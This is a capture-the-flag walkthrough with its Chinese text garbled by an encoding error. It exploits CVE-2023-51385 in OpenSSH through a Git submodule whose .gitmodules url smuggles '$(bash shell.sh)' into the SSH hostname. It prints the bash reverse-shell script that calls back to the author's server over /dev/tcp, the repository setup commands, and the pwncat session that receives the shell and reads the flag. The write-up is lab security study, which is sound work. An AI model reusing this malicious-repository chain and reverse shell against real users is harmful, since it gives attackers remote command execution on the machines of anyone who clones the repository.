# CVE-2023-51385

:::info

Tags

- OpenSSH 9.6 å‘½ä»¤æ³¨å…¥

å®˜æ–¹æ•°æ®åº“è®°å½•

> åœ¨ 9.6 ä¹‹å‰çš„ OpenSSH ä¸­çš„ ssh ä¸­ï¼Œå¦‚æœç”¨æˆ·åæˆ–ä¸»æœºåå…·æœ‰ shell å…ƒå­—ç¬¦ï¼Œå¹¶ä¸”åœ¨æŸäº›æƒ…å†µä¸‹è¯¥åç§°è¢«æ‰©å±•ä»¤ç‰Œå¼•ç”¨ï¼Œåˆ™å¯èƒ½ä¼šå‘ç”Ÿæ“ä½œç³»ç»Ÿå‘½ä»¤æ³¨å…¥ã€‚ ä¾‹å¦‚ï¼Œä¸å—ä¿¡ä»»çš„ Git å­˜å‚¨åº“å¯èƒ½æœ‰ä¸€ä¸ªç”¨æˆ·åæˆ–ä¸»æœºåä¸­åŒ…å« shell å…ƒå­—ç¬¦çš„å­æ¨¡å—ã€‚

:::

å‚è€ƒ

- [SSH ProxyCommand == unexpected code execution (CVE-2023-51385) | Vin01â€™s Blog](https://vin01.github.io/piptagole/ssh/security/openssh/libssh/remote-code-execution/2023/12/20/openssh-proxycommand-libssh-rce.html)

é¦–å…ˆï¼Œé¢˜ç›®é™åˆ¶äº†ä½¿ç”¨ `Github` ä»£ç æ‰˜ç®¡æœåŠ¡ï¼Œå¯ä»¥ä½¿ç”¨ `Gitee` æˆ–è€… [Gogs: A painless self-hosted Git service](https://gogs.io) è‡ªæ‰˜ç®¡ä¸€ä¸ª Git æœåŠ¡

è¿™é‡Œæˆ‘é€‰æ‹©ä½¿ç”¨ [Gogs: A painless self-hosted Git service](https://gogs.io) è‡ªæ‰˜ç®¡ä¸€ä¸ª Git æœåŠ¡

![img](img/image_20240711-231121.png)

## åˆ›å»º submodule ä»“åº“

é¦–å…ˆï¼Œå…ˆåˆ›å»ºä¸€ä¸ªä»“åº“ï¼Œåªæ”¾ç½® `README.md` æ–‡ä»¶ï¼Œä½œä¸ºåç»­åˆ©ç”¨çš„ submodule

```shell
â”Œâ”€â”€(randark ã‰¿ kali)-[~/pocs]
â””â”€$ mkdir CVE-2023-51385-submodule

â”Œâ”€â”€(randark ã‰¿ kali)-[~/pocs]
â””â”€$ cd CVE-2023-51385-submodule/

â”Œâ”€â”€(randark ã‰¿ kali)-[~/pocs/CVE-2023-51385-submodule]
â””â”€$ echo "test" > README.md

â”Œâ”€â”€(randark ã‰¿ kali)-[~/pocs/CVE-2023-51385-submodule]
â””â”€$ ls -lh
total 4.0K
-rw-rw-r-- 1 randark randark 5 Jul 24 23:14 README.md
```

ç„¶ååˆå§‹åŒ– git ä»“åº“ï¼Œå¹¶è®¾ç½®ä»“åº“ï¼Œåˆ›å»ºæäº¤

:::warning

ç»è¿‡æµ‹è¯•ï¼Œè¿œç¨‹é¶æœºçš„ git æœåŠ¡åªæ¥å—åˆ†æ”¯åä¸º `master` çš„ä»“åº“

:::

```shell
â”Œâ”€â”€(randark ã‰¿ kali)-[~/pocs/CVE-2023-51385-submodule]
â””â”€$ git config --global init.defaultBranch master

â”Œâ”€â”€(randark ã‰¿ kali)-[~/pocs/CVE-2023-51385-submodule]
â””â”€$ git init
Initialized empty Git repository in /home/randark/pocs/CVE-2023-51385-submodule/.git/

â”Œâ”€â”€(randark ã‰¿ kali)-[~/pocs/CVE-2023-51385-submodule]
â””â”€$ git add README.md

â”Œâ”€â”€(randark ã‰¿ kali)-[~/pocs/CVE-2023-51385-submodule]
â””â”€$ git commit -m "init"
[master (root-commit) e7f93b0] init
 1 file changed, 1 insertion(+)
 create mode 100644 README.md
```

ç„¶ååœ¨ gogs å¹³å°ä¸Šå»ºç«‹ä¸€ä¸ªä»“åº“ï¼Œåœ¨æœ¬åœ° git ä»“åº“æ·»åŠ è¿œç¨‹ä»“åº“ï¼Œå¹¶æ¨é€

```shell
â”Œâ”€â”€(randark ã‰¿ kali)-[~/pocs/CVE-2023-51385-submodule]
â””â”€$ git remote add origin http://139.*.*.*:3000/123/CVE-2023-51385-submodule.git

â”Œâ”€â”€(randark ã‰¿ kali)-[~/pocs/CVE-2023-51385-submodule]
â””â”€$ git push -u origin master
Enumerating objects: 3, done.
Counting objects: 100% (3/3), done.
Writing objects: 100% (3/3), 212 bytes | 212.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
Username for 'http://139.*.*.*:3000': 123
Password for 'http://123@139.*.*.*:3000':
To http://139.*.*.*:3000/123/CVE-2023-51385-submodule.git
 * [new branch]      master -> master
branch 'master' set up to track 'origin/master'.
```

æ­¤æ—¶ï¼Œåœ¨ gogs å¹³å°ä¸Šå°±å¯ä»¥çœ‹åˆ°åˆ›å»ºå¥½çš„ä»“åº“äº†

![img](img/image_20240719-231950.png)

## åˆ›å»ºä¸»ä»“åº“

å¦‚æ³•ç‚®åˆ¶ï¼Œåœ¨æœ¬åœ°åˆ›å»ºä¸€ä¸ª `CVE-2023-51385-main` ä»“åº“ï¼Œå¹¶åŒæ­¥åˆ°è¿œç¨‹ gogs å¹³å°

```shell
â”Œâ”€â”€(randark ã‰¿ kali)-[~/pocs]
â””â”€$ mkdir CVE-2023-51385-main

â”Œâ”€â”€(randark ã‰¿ kali)-[~/pocs]
â””â”€$ cd CVE-2023-51385-main/

â”Œâ”€â”€(randark ã‰¿ kali)-[~/pocs/CVE-2023-51385-main]
â””â”€$ echo "test" > README.md

â”Œâ”€â”€(randark ã‰¿ kali)-[~/pocs/CVE-2023-51385-main]
â””â”€$ git init
Initialized empty Git repository in /home/randark/pocs/CVE-2023-51385-main/.git/

â”Œâ”€â”€(randark ã‰¿ kali)-[~/pocs/CVE-2023-51385-main]
â””â”€$ git add README.md

â”Œâ”€â”€(randark ã‰¿ kali)-[~/pocs/CVE-2023-51385-main]
â””â”€$ git commit -m "init"
[master (root-commit) 7cd224b] init
 1 file changed, 1 insertion(+)
 create mode 100644 README.md

â”Œâ”€â”€(randark ã‰¿ kali)-[~/pocs/CVE-2023-51385-main]
â””â”€$ git remote add origin http://139.*.*.*:3000/123/CVE-2023-51385-main.git

â”Œâ”€â”€(randark ã‰¿ kali)-[~/pocs/CVE-2023-51385-main]
â””â”€$ git push -u origin master
Enumerating objects: 3, done.
Counting objects: 100% (3/3), done.
Writing objects: 100% (3/3), 213 bytes | 213.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
Username for 'http://139.*.*.*:3000': 123
Password for 'http://123@139.*.*.*:3000':
To http://139.*.*.*:3000/123/CVE-2023-51385-main.git
 * [new branch]      master -> master
branch 'master' set up to track 'origin/master'.
```

åœ¨å¹³å°ä¸Šå¯ä»¥çœ‹åˆ°

![img](img/image_20240722-232248.png)

## ä¸»ä»“åº“æ·»åŠ  submodule

```shell
â”Œâ”€â”€(randark ã‰¿ kali)-[~/pocs/CVE-2023-51385-main]
â””â”€$ git submodule add http://139.*.*.*:3000/123/CVE-2023-51385-submodule.git abc123
Cloning into '/home/randark/pocs/CVE-2023-51385-main/abc123'...
remote: Enumerating objects: 3, done.
remote: Counting objects: 100% (3/3), done.
remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
Unpacking objects: 100% (3/3), 192 bytes | 192.00 KiB/s, done.

â”Œâ”€â”€(randarkã‰¿kali)-[~/pocs/CVE-2023-51385-main]
â””â”€$ git commit -m "add submodule"
[master 8218e99] add submodule
 2 files changed, 4 insertions(+)
 create mode 100644 .gitmodules
 create mode 160000 abc123
```

## ä¿®æ”¹ .gitmodules æ–‡ä»¶ æ¤å…¥æ¶æ„è½½è·

```properties title="åŸæœ¬çš„ .gitmodules æ–‡ä»¶"
[submodule "abc123"]
        path = abc123
        url = http://139.*.*.*:3000/123/CVE-2023-51385-submodule.git
```

```properties title="ä¿®æ”¹åçš„ .gitmodules æ–‡ä»¶"
[submodule "abc123"]
        path = abc123
        url = ssh://$(bash shell.sh).ichunqiu.com/bar
```

åŒæ—¶æ·»åŠ æ¶æ„è„šæœ¬åˆ°æ ¹ç›®å½•

```shell title="shell.sh"
/bin/bash -i >& /dev/tcp/139.*.*.*/9999 0>&1
```

## æ›´æ–°ä¿®æ”¹åˆ°è¿œç¨‹ä¸»ä»“åº“

```shell
â”Œâ”€â”€(randark ã‰¿ kali)-[~/pocs/CVE-2023-51385-main]
â””â”€$ git submodule update --init --recursive

â”Œâ”€â”€(randark ã‰¿ kali)-[~/pocs/CVE-2023-51385-main]
â””â”€$ git add .gitmodules abc123

â”Œâ”€â”€(randarkã‰¿kali)-[~/pocs/CVE-2023-51385-main]
â””â”€$ git commit -m "add evil"
[master e344f5c] add evil
 2 files changed, 2 insertions(+), 1 deletion(-)
 create mode 100644 shell.sh

â”Œâ”€â”€(randark ã‰¿ kali)-[~/pocs/CVE-2023-51385-main]
â””â”€$ git push -u origin master
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 4 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 396 bytes | 396.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
Username for 'http://139.*.*.*:3000': 123
Password for 'http://123@139.*.*.*:3000':
To http://139.*.*.*:3000/123/CVE-2023-51385-main.git
   7cd224b..68f1b06  master -> master
branch 'master' set up to track 'origin/master'.
```

æ“ä½œä¹‹åï¼Œåœ¨ gogs å¹³å°ä¸Šå¯ä»¥çœ‹åˆ°

![img](img/image_20240726-232650.png)

## æ‰§è¡Œæ”»å‡»

åœ¨vpsä¸Šè®¾ç½®ç›‘å¬å™¨

```shell
root@jmt-projekt:~# pwncat-cs -lp 9999
[23:37:02] Welcome to pwncat ğŸˆ!
bound to 0.0.0.0:9999
```

ç„¶ååœ¨é¶æœºä¸Šå¡«å…¥`CVE-2023-51385-main`ä»“åº“çš„è¿œç¨‹åœ°å€

```plaintext
http://139.*.*.*:3000/123/CVE-2023-51385-main.git
```

å³å¯æ”¶åˆ°å›è¿

```shell
root@jmt-projekt:~# pwncat-cs -lp 9999
[23:37:02] Welcome to pwncat ğŸˆ!
[23:59:02] received connection from 39.106.20.178:33530
[23:59:03] 39.106.20.178:33530: registered new host w/ db
(local) pwncat$ back
(remote) www-data@engine-2:/tmp/CVE-2023-51385-main$ cd /
(remote) www-data@engine-2:/$ cat flag
flag{f5a44b2a-078d-479e-9382-b66a2b986c49}
```
